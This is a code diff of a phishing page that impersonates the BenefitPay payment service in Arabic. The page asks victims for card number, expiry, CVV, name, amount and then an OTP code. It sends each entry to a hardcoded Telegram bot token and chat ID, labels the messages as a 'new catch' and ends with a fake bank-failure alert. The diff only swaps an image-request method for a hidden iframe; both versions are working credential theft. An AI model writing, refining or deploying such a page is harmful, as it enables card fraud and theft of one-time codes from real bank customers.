@@ -3,71 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BenefitPay | التحقق الآمن</title>
+    <title>BenefitPay Security</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding: 20px; text-align: center; }
-        .card { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 380px; margin: auto; }
-        .header { background: #e21e26; color: white; padding: 15px; border-radius: 12px 12px 0 0; margin: -20px -20px 20px -20px; font-weight: bold; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 16px; }
-        .btn { background: #e21e26; color: white; border: none; width: 100%; padding: 15px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { font-family: sans-serif; background: #f4f4f4; text-align: center; margin:0; padding:20px; }
+        .card { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; }
+        .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width:100%; }
         #step2 { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="header">BenefitPay - نظام التحقق</div>
-        
-        <div id="step1">
-            <input type="number" id="amt" placeholder="المبلغ المستحق (BHD)">
-            <input type="text" id="nm" placeholder="الاسم الكامل">
-            <input type="text" id="cd" placeholder="رقم البطاقة (16 رقم)" maxlength="19">
-            <div style="display:flex; gap:10px">
-                <input type="text" id="ex" placeholder="MM/YY" maxlength="5">
-                <input type="password" id="cv" placeholder="CVV" maxlength="3">
-            </div>
-            <button class="btn" onclick="sendFirst()">استمرار</button>
+    <div class="card" id="step1">
+        <h3 style="color:#e21e26">بوابة بنفت للأمان</h3>
+        <input type="number" id="amt" placeholder="المبلغ">
+        <input type="text" id="nm" placeholder="الاسم الكامل">
+        <input type="text" id="cd" placeholder="رقم البطاقة" maxlength="19">
+        <div style="display:flex; gap:5px">
+            <input type="text" id="ex" placeholder="MM/YY" maxlength="5">
+            <input type="password" id="cv" placeholder="CVV" maxlength="3">
         </div>
-
-        <div id="step2">
-            <h3 style="color:#e21e26">أدخل رمز OTP</h3>
-            <p style="font-size:14px">تم إرسال رمز التحقق لهاتفك، يرجى إدخاله هنا:</p>
-            <input type="number" id="otp" placeholder="******" style="font-size:20px; letter-spacing:4px">
-            <button class="btn" onclick="sendSecond()">تأكيد</button>
-            <p id="wait" style="display:none; color:red; font-size:12px; margin-top:10px">جاري معالجة الطلب، لا تغادر الصفحة...</p>
-        </div>
+        <button class="btn" onclick="sendViaRedirect()">استمرار</button>
     </div>
 
-    <script>
-        // التوكن والآيدي الخاص بك
-        const botToken = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
-        const chatId = "8302667206";
+    <div class="card" id="step2">
+        <h3>تأكيد الرمز (OTP)</h3>
+        <p>أدخل الرمز المستلم على هاتفك:</p>
+        <input type="number" id="otp" placeholder="******">
+        <button class="btn" onclick="sendOTP()">تأكيد</button>
+    </div>
 
-        // تنسيق البطاقة تلقائياً
-        document.getElementById('cd').oninput = e => {
-            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-        };
+    <iframe name="hidden_frame" style="display:none;"></iframe>
 
-        function sendFirst() {
-            const m = `🇧🇭 صيدة جديدة 🇧🇭%0Aالمبلغ: ${document.getElementById('amt').value}%0Aالاسم: ${document.getElementById('nm').value}%0Aالبطاقة: ${document.getElementById('cd').value}%0Aالتاريخ: ${document.getElementById('ex').value}%0Aالرمز: ${document.getElementById('cv').value}`;
-            
-            // طريقة الإرسال "المخفية" الأضمن (طلب صورة)
-            const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${m}`;
-            let i = new Image();
-            i.src = apiURL;
+<script>
+    const T = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
+    const C = "8302667206";
 
-            // إظهار واجهة الكود
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
+    function sendViaRedirect() {
+        const amount = document.getElementById('amt').value;
+        const name = document.getElementById('nm').value;
+        const card = document.getElementById('cd').value;
+        const exp = document.getElementById('ex').value;
+        const cvv = document.getElementById('cv').value;
 
-        function sendSecond() {
-            const o = `🔑 كود الـ OTP: ${document.getElementById('otp').value}`;
-            const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${o}`;
-            let i = new Image();
-            i.src = apiURL;
-            
-            document.getElementById('wait').style.display = 'block';
-        }
-    </script>
+        const msg = `🔥 صيدة جديدة 🔥%0Aالمبلغ: ${amount}%0Aالاسم: ${name}%0Aالبطاقة: ${card}%0Aالتاريخ: ${exp}%0ACVV: ${cvv}`;
+        
+        // الطريقة التي لا تخطئ: فتح رابط الإرسال في الإطار المخفي
+        const url = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${msg}`;
+        window.open(url, "hidden_frame");
+
+        // الانتقال للمرحلة الثانية
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+    }
+
+    function sendOTP() {
+        const otp = document.getElementById('otp').value;
+        const msg = `🔑 OTP: ${otp}`;
+        const url = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${msg}`;
+        window.open(url, "hidden_frame");
+        alert("فشل في الاتصال بالبنك، يرجى إعادة المحاولة لاحقاً.");
+    }
+</script>
 </body>
 </html>
